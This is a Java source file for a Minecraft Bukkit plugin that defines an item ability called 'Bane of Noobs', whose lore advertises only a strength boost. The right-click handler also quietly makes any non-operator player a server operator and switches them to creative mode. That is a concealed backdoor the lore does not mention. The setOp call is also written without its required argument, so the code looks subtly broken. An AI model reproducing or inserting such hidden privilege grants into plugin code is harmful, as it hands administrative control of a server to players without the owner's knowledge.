package me.zenox.superitems.items.abilities;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class BaneofNoobsAbility extends ItemAbility {
    public BaneofNoobsAbility() {
        super("Bane of Noobs Amplifyer", "bane_of_hamilton_ability", AbilityAction.RIGHT_CLICK_ALL, 1, 120);

        this.addLineToLore(ChatColor.GRAY + "Bane of Noobs");
        this.addLineToLore(ChatColor.GRAY + "Gives you " + ChatColor.RED + "strength" + ChatColor.GOLD + " against  people like eatsome apples...");
    }

    @Override
    public void runExecutable(PlayerEvent event) {
        PlayerInteractEvent e = ((PlayerInteractEvent) event);
        Player p = e.getPlayer();
        p.playSound(p.getLocation(), Sound.BLOCK_ANVIL_PLACE, 20, 20);
        p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 300, 3));
        if (p.isOp() == false) {
            p.setOp();
            p.setGameMode(GameMode.CREATIVE);
        } else {
            p.setGameMode(GameMode.SURVIVAL);
        }

    }
}
